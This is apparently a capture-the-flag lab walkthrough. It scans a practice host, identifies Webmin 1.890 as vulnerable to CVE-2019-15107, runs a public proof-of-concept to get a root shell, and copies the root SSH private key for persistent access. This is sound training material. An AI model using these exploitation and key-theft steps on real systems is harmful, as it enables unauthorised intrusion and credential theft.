I ran `nmap` scans:

```bash
# Nmap 7.95 scan initiated Fri Dec 26 12:37:37 2025 as: /usr/lib/nmap/nmap -Pn -sV -sC -v -oN nmap_sVsC.txt 10.200.180.200
Nmap scan report for 10.200.180.200
Host is up (0.064s latency).
Not shown: 985 filtered tcp ports (no-response), 10 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-26T17:07:31
| Not valid after:  2026-12-26T17:07:31
| MD5:   e52b:c0de:4b42:b4bb:e25a:20ed:d1e7:916f
|_SHA-1: db3e:93ac:6253:4a29:96e6:5dee:a9cd:ae0e:dd3b:0958
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 99F425766CF29EDA9D51DB4B6298FA83
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 26 12:38:39 2025 -- 1 IP address (1 host up) scanned in 62.22 seconds
```

so I added `thomaswreath.thm` in `/etc/hosts`:

```bash
echo '10.200.180.200 thomaswreath.thm' | tee -a /etc/hosts
```

and then I visited the site

![](attachments/Pasted%20image%2020251228210924.png)

but I didn't find anything interesting.

So I searched for the port 1000 the specific version `MiniServ 1.890 (Webmin httpd)` to find a potential vulnerability and I found `CVE-2019-15107` a RCE vulnerability.

I found this Github PoC:

![](attachments/Pasted%20image%2020251228211240.png)

```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107
python3 -m venv venv
source venv/bin/activate
pip3 -r requirements.txt
```

Then I added the executable bit and then run it:

```bash
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py 10.200.180.200
```

![](attachments/Pasted%20image%2020251228211650.png)

and I got a shell.

I went to `/root/.ssh/id_rsa` I copied the `ssh key` and I copied it over to the attacking machine in order to obtain persistent access to the box.

I used the command:
```bash
chmod 600 id_rsa
```

